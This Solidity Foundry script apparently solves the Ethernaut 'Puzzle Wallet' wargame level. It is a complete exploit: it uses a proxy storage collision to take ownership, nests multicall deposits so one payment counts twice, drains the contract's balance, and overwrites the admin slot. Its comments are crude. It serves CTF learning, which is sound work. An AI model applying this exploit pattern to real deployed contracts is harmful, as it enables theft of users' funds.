//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Ipuzzle} from "../../src/ethernaut/puzzle.sol";

// check puzzle.t.sol in the test folder for more details;

contract hackPuzzleWallet is Script {
    Ipuzzle puzzle = Ipuzzle(0x605f5BDC2CA9dc9531579A49dCFc2Ae3f7Ad4631);

    function run() public {
        vm.startBroadcast();
        //take ownership ;
        puzzle.proposeNewAdmin(msg.sender);
        //add yourself to the whitelist
        puzzle.addToWhitelist(msg.sender);
        //call the multicall with data and value of 0.001 eth
        puzzle.multicall{value: 0.001 ether}(encodeData());
        // call the excute function to withdraw all the money :
        puzzle.execute(msg.sender, 0.002 ether, "");
        // call the setMaxBalance and change it to the uint(address) of you ;
        uint me = uint(uint160(msg.sender));
        puzzle.setMaxBalance(me);
        // check if the address of the admin is you ;
        address newadmin = puzzle.admin();
        if (newadmin == msg.sender) {
            console.log("congratulation you are the new admin ..");
        } else {
            console.log(
                "getTheFuckOutOfHere , you fucked up to take the admin roll "
            );
        }
    }

    function encodeData() public pure returns (bytes[] memory) {
        bytes[] memory args = new bytes[](2);
        bytes[] memory deposit = new bytes[](1);
        deposit[0] = abi.encodeWithSignature("deposit()");
        bytes memory multicall = abi.encodeWithSignature(
            "multicall(bytes[])",
            deposit
        );
        args[0] = abi.encodeWithSignature("deposit()");
        args[1] = multicall;
        return args;
    }
}
